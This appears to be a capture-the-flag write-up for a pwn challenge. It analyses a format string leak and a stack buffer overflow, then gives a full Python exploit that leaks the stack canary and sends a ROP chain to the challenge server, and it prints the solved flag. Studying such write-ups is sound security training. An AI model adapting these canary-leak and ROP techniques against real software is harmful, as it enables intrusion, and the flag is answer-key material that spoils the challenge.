#Pwn 
### 1. Security Mitigations
Initial check of the binary reveals:
- **Stack Canary:** Enabled (requires leaking or bypassing).
- **NX (No-Execute):** Enabled (stack is not executable).
- **PIE (Position Independent Executable):** Disabled (base address is fixed at `0x400000`).
- **Symbols:** Not stripped, making analysis easier.

### 2. Vulnerabilities
The `find_treasure` function contains two distinct vulnerabilities:

#### A. Format String Vulnerability
```c
// Decompiled/Analyzed logic
char name[10];
read(0, name, 10);
printf("Hello ");
printf(name); // <-- Format string vulnerability
```
The program reads 10 bytes into a buffer and passes it directly to `printf`. Since the buffer is on the stack, we can use this to leak the **Stack Canary**.

#### B. Stack Buffer Overflow
```c
// Decompiled/Analyzed logic
char buffer[48]; // rbp-0x30
read(0, buffer, 0x70); // <-- Buffer overflow
```
The program reads `0x70` (112) bytes into a buffer of size 48 (actually 64 allocated on stack, but the buffer starts at `rbp-0x30`). This allows us to overwrite the saved instruction pointer (RIP) after bypassing the canary.

### 3. The `win` Function
There is a `win` function at `0x4011a6` that reads `flag.txt`. However, it has a check:
```c
if (arg1 == 6 || arg2 == 7) {
    // Read and print flag
}
```
Actually, looking at the disassembly:
```asm
4011c7:       80 7d ac 06             cmp    BYTE PTR [rbp-0x54],0x6
4011cb:       74 1c                   je     4011e9 <win+0x43>
4011cd:       80 7d a8 07             cmp    BYTE PTR [rbp-0x58],0x7
4011d1:       74 16                   je     4011e9 <win+0x43>
```
If either `rdi == 6` or `rsi == 7`, it proceeds to read the flag.

## Exploitation Strategy

1.  **Leak Canary:** Use the format string vulnerability. By testing with `%p`, the canary was found at the 13th position on the stack (`%13$p`).
2.  **ROP Chain:** 
    - Use `pop rdi; ret` (found at `0x40132d`) to set `rdi = 6`.
    - Use `pop rsi; ret` (found at `0x40132f`) to set `rsi = 7`.
    - Call `win` (`0x4011a6`).
3.  **Payload Structure:**
    `[Padding (40 bytes)] + [Canary (8 bytes)] + [Saved RBP (8 bytes)] + [ROP Chain]`

## Exploit Script
```python
import socket
import struct
import time

def solve():
    host = 'chal.bearcatctf.io'
    port = 28799
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # 1. Leak Canary
    s.recv(1024) # "Welcome..."
    s.send(b"%13$p
")
    data = s.recv(1024).decode(errors='ignore')
    canary = int(data.split("Hello ")[1].split()[0], 16)
    
    # 2. Build ROP Chain
    pop_rdi = 0x40132d
    pop_rsi = 0x40132f
    win = 0x4011a6

    payload = b"A" * 40
    payload += struct.pack("<Q", canary)
    payload += b"B" * 8 # Saved RBP
    payload += struct.pack("<Q", pop_rdi)
    payload += struct.pack("<Q", 6)
    payload += struct.pack("<Q", pop_rsi)
    payload += struct.pack("<Q", 7)
    payload += struct.pack("<Q", win)

    # 3. Trigger Buffer Overflow
    s.recv(1024) # "Where do you think..."
    s.send(payload + b"
")
    
    # 4. Get the Flag
    time.sleep(1)
    print(s.recv(1024).decode(errors='ignore'))

if __name__ == "__main__":
    solve()
```

## Flag
`BCCTF{rOp_cHaIn_hAs_BeEn_pWnEd}`
